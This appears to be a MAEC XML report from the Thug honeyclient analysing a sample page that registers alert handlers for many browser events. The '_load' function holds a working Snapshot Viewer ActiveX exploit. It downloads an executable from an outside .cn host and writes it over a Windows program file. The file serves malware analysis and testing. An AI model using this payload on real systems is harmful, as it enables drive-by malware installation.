@@ -1,0 +1,255 @@
+<MAEC_Bundle xmlns:ns1="http://xml/metadataSharing.xsd" xmlns="http://maec.mitre.org/XMLSchema/maec-core-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maec.mitre.org/XMLSchema/maec-core-1 file:MAEC_v1.1.xsd" id="maec:thug:bnd:1" schema_version="1.100000">
+    <Analyses>
+        <Analysis start_datetime="2012-12-11 21:00:46.597061" id="maec:thug:ana:2" analysis_method="Dynamic">
+            <Subject>
+                <Object object_name="http://127.0.0.1/thug/samples/./exploits/testEvents.html" type="URI" id="maec:thug:obj:3">
+                    <Associated_Code>
+                        <Associated_Code_Snippet>
+                            <Code_Snippet language="Javascript" id="maec:thug:cde:7">
+                                <Discovery_Method tool_id="maec:thug:tol:6" method="Dynamic Analysis"/>
+                                <Code_Segment>
+					
+					
+					alert(window.innerWidth);
+					alert(window.innerHeigth);
+					alert(this);
+					
+					window.onabort = abort;
+					window.onbeforeunload = beforeunload;
+					window.onblur = blur;
+					window.onchange = change;
+					window.onclick = click;
+					window.onclose = close;
+					window.oncontextmenu = contextmenu;
+					window.ondragdrop = dragdrop;
+					window.onerror = error;
+					window.onfocus = focus;
+					window.onhashchange = hashchange;
+					window.onkeydown = keydown;
+					window.onkeypress = keypress;
+					window.onkeyup = keyup;
+					window.onload = load;
+					window.onmousedown = mousedown;
+					window.onmousemove = mousemove;
+					window.onmouseout = mouseout;
+					window.onmouseover = mouseover;
+					window.onmouseup = mouseup;
+					window.onmozorientation = mozorientation;
+					window.onpaint = paint;
+					window.onpopstate = popstate;
+					window.onreset = reset;
+					window.onresize = resize;
+					window.onscroll = scroll;
+					window.onselect = select;
+					window.onsubmit = submit;
+					window.onunload = unload;
+					window.onpageshow = pageshow;
+					window.onpagehide = pagehide;
+					
+					function foo()
+					{
+						alert("Call to foo() detected!");
+					}
+					
+					function _load()  
+					{ 
+						try{
+							ret = new ActiveXObject("snpvw.Snapshot Viewer Control.1");
+							var arbitrary_file = 'http://paksusic.cn/nuc/exe.php';
+							var dest = 'C:/Program Files/Outlook Express/wab.exe';
+							document.write("&lt;object classid='clsid:F0E42D60-368C-11D0-AD81-00A0C90DC8D9' id='attack'&gt;&lt;/object&gt;");
+							attack.SnapshotPath = arbitrary_file;
+							setTimeout('window.location = "ldap://127.0.0.1"',2000);
+							attack.CompressedPath = dest;
+							attack.PrintSnapshot(arbitrary_file,dest);
+						} catch(e) 
+						{ }
+						alert("load event detected!");
+						foo();
+					}
+					
+					function abort() {
+					        alert("abort event detected!");
+					        foo();
+					}
+					
+					function beforeunload() {
+					        alert("beforeunload event detected!");
+					        foo();
+					}
+					
+					function blur() {
+					        alert("blur event detected!");
+					        foo();
+					}
+					
+					function change() {
+					        alert("change event detected!");
+					        foo();
+					}
+					
+					function click() {
+					        alert("click event detected!");
+					        foo();
+					}
+					
+					function close() {
+					        alert("close event detected!");
+					        foo();
+					}
+					
+					function contextmenu() {
+					        alert("contextmenu event detected!");
+					        foo();
+					}
+					
+					function dragdrop() {
+					        alert("dragdrop event detected!");
+					        foo();
+					}
+					
+					function error() {
+					        alert("error event detected!");
+					        foo();
+					}
+					
+					function focus() {
+					        alert("focus event detected!");
+					        foo();
+					}
+					
+					function hashchange() {
+					        alert("hashchange event detected!");
+					        foo();
+					}
+					
+					function keydown() {
+					        alert("keydown event detected!");
+					        foo();
+					}
+					
+					function keypress() {
+					        alert("keypress event detected!");
+					        foo();
+					}
+					
+					function keyup() {
+					        alert("keyup event detected!");
+					        foo();
+					}
+					
+					function load() {
+					        alert("load event detected!");
+					        foo();
+					}
+					
+					function mousedown() {
+					        alert("mousedown event detected!");
+					        foo();
+					}
+					
+					function mousemove() {
+					        alert("mousemove event detected!");
+					        foo();
+					}
+					
+					function mouseout() {
+					        alert("mouseout event detected!");
+					        foo();
+					}
+					
+					function mouseover() {
+					        alert("mouseover event detected!");
+					        foo();
+					}
+					
+					function mouseup() {
+					        alert("mouseup event detected!");
+					        foo();
+					}
+					
+					function mozorientation() {
+					        alert("mozorientation event detected!");
+					        foo();
+					}
+					
+					function paint() {
+					        alert("paint event detected!");
+					        foo();
+					}
+					
+					function popstate() {
+					        alert("popstate event detected!");
+					        foo();
+					}
+					
+					function reset() {
+						alert("reset event detected!");
+						foo();
+					}
+					
+					function resize() {
+					        alert("resize event detected!");
+					        foo();
+					}
+					
+					function scroll() {
+					        alert("scroll event detected!");
+					        foo();
+					}
+					
+					function select() {
+					        alert("select event detected!");
+					        foo();
+					}
+					
+					function submit() {
+					        alert("submit event detected!");
+					        foo();
+					}
+					
+					function unload() {
+					        alert("unload event detected!");
+					        foo();
+					}
+					
+					function pageshow() {
+					        alert("pageshow event detected!");
+					        foo();
+					}
+					
+					function pagehide() {
+					        alert("pagehide event detected!");
+					        foo();
+					}
+					
+					
+				</Code_Segment>
+                            </Code_Snippet>
+                            <Nature_Of_Relationship>Contained_Inside</Nature_Of_Relationship>
+                        </Associated_Code_Snippet>
+                    </Associated_Code>
+                    <Internet_Object_Attributes>
+                        <URI>http://127.0.0.1/thug/samples/./exploits/testEvents.html</URI>
+                    </Internet_Object_Attributes>
+                </Object>
+            </Subject>
+            <Tools_Used>
+                <Tool id="maec:thug:tol:1">
+                    <Name>Thug</Name>
+                    <Version>0.4.9</Version>
+                    <Organization>The Honeynet Project</Organization>
+                </Tool>
+            </Tools_Used>
+        </Analysis>
+    </Analyses>
+    <Behaviors>
+        <Behavior id="maec:thug:bhv:4">
+            <Description>
+                <Text>[HTTP] URL: http://127.0.0.1/thug/samples/./exploits/testEvents.html (Status: 200, Referrer: None)</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:5" method="Dynamic Analysis"/>
+        </Behavior>
+    </Behaviors>
+    <Pools/>
+</MAEC_Bundle>
